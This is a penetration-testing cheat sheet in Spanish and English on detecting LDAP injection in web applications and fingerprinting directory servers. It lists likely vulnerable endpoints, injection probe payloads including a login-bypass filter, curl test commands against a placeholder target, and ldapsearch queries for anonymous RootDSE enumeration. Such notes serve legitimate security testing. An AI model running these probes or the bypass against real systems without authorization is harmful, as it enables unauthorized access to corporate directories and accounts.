---
aliases:
  - LDAP Detection
  - LDAP Recon
  - LDAP Fingerprint
tags:
  - type/technique
  - vuln/ldap-injection
  - technique/discovery
  - asset/web-app
  - asset/directory-service
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[LDAP Injection]]"
---
# LDAP Injection - Detección y Reconocimiento

***

## Identificar Endpoints con LDAP Backend

| **Endpoint type** | **Pattern** | **Riesgo** |
|:---:|:---:|:---:|
| Login form corporativo | `username` + `password` post-corporate | LDAP bind clásico. |
| Active Directory SSO | Stack Microsoft, Kerberos / NTLM | AD authoritative. |
| Phone book / address book search | Search por `cn`, `mail`, `phone` | LDAP search injection. |
| Org chart / directory | Listing employees | Search injection. |
| Email auto-complete | Type-ahead que consulta LDAP | Same. |
| Password reset (corp) | Look up user by email | LDAP search. |
| Group membership query | `memberOf` lookups | Filter injection. |
| Permission check | Role-based query | Filter manipulation. |
| Profile picture lookup | `jpegPhoto` attribute | Schema attribute. |
| File share permission | LDAP-backed ACL | Auth + authorization. |
| VPN auth | OpenVPN / FortiClient con LDAP | Bind injection. |
| Email server auth | Postfix / Dovecot SASL | Same. |
| Headers cookies | `LDAP_*` env vars en errors | Stack indicator. |
| Error messages típicos | `LDAPException`, `javax.naming.directory`, `LDAPError` | Java `java.naming` o C `libldap`. |
| Specific errors | `Bad search filter`, `Filter syntax error` | Direct evidence. |
^ldap-detect-endpoints

___

## Probes de Inyección

| **Char** | **Payload** | **Indicador** |
|:---:|:---:|:---:|
| Asterisk `*` | `username=*` o `username=ad*` | Wildcard match — múltiples results vs single result. |
| Open paren `(` | `username=(` | Filter syntax error → confirma LDAP. |
| Close paren `)` | `username=)` | Same — broken filter. |
| Pipe `|` | `username=test|` | OR operator interpretation. |
| Ampersand `&` | `username=test&` | AND operator. |
| Equals `=` | `username==` | Reserved char. |
| NUL byte `\x00` | `username=test%00` | Filter truncation. |
| Backslash `\` | `username=test\` | Escape character. |
| Combining probe | `username=*)(uid=*)` | Inject sub-filter — confirms LDAP. |
| Login bypass probe | `username=admin)(&)` con `password=x` | If returns ALL users → vulnerable. |
| Search probe | `q=*)(objectClass=*)` | Returns all objects. |
| Wildcard test | Single `*` character → if matches everyone, broken filter | LDAP search behavior. |
| Filter injection | `cn=*)(uid=admin*)` | Multiple criteria. |
| Sleep probe (timing) | Heavy filter `(|(cn=a)(cn=b)(cn=c)...)` | Time differential. |
| Error verbose | Trigger error con malformed filter | Stack trace reveals lib/version. |
^ldap-detect-probes

### Probe rápido

```bash
# 1. Asterisk wildcard
curl -d "username=*&password=any" https://target/login

# 2. Paréntesis
curl -d "username=(&password=any" https://target/login

# 3. Sub-filter inject
curl -d "username=*)(uid=*&password=any" https://target/login

# 4. Compare responses
# Si 2 y 3 dan errores ≠ 1 → vulnerable a LDAP injection
```

___

## Fingerprint del Directory Server

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Header `Server: AD` o `Microsoft-HTTPAPI` | Active Directory (Windows) | Stack Microsoft. |
| Errores con `samAccountName` | AD-specific attribute | AD confirmed. |
| Errors con `objectSid` o `userPrincipalName` | AD attributes | Same. |
| Port 389 / 636 (LDAPS) standard | Universal LDAP | Default. |
| Port 3268 / 3269 (Global Catalog) | AD GC | AD with multiple domains. |
| OpenLDAP error pattern `back-mdb`, `slapd` | OpenLDAP | Linux common. |
| 389-ds error `slapd-` | 389 Directory Server | RHDS / FreeIPA. |
| Apache DS errors `org.apache.directory` | Apache Directory Server | Java. |
| Novell eDirectory `dsRepair`, `ndsRepair` | Novell legacy | Edge. |
| OpenDJ (formerly OpenDS) | Java LDAP | Open source AD alt. |
| RootDSE query | `ldapsearch -H ldap://target -x -s base -b "" supportedLDAPVersion namingContexts` | Banner reveals server. |
| Schema enumeration | `ldapsearch ... -b "cn=schema"` | Schema info. |
| supportedSASLMechanisms | Reveals auth methods | GSSAPI, DIGEST-MD5, etc. |
| supportedControl | Server features | OIDs revealing implementation. |
| Vendor name in RootDSE | Some servers expose vendorName | Direct fingerprint. |
^ldap-detect-fingerprint

### Probe RootDSE

```bash
# Anónimo bind + RootDSE
ldapsearch -H ldap://target.com -x -s base -b "" \
  "(objectClass=*)" supportedLDAPVersion namingContexts \
  supportedSASLMechanisms vendorName vendorVersion

# Output útil:
# supportedLDAPVersion: 3
# namingContexts: dc=target,dc=com
# supportedSASLMechanisms: GSSAPI
# vendorName: Apache Software Foundation
# vendorVersion: Apache Directory Server 2.0.0
```

***
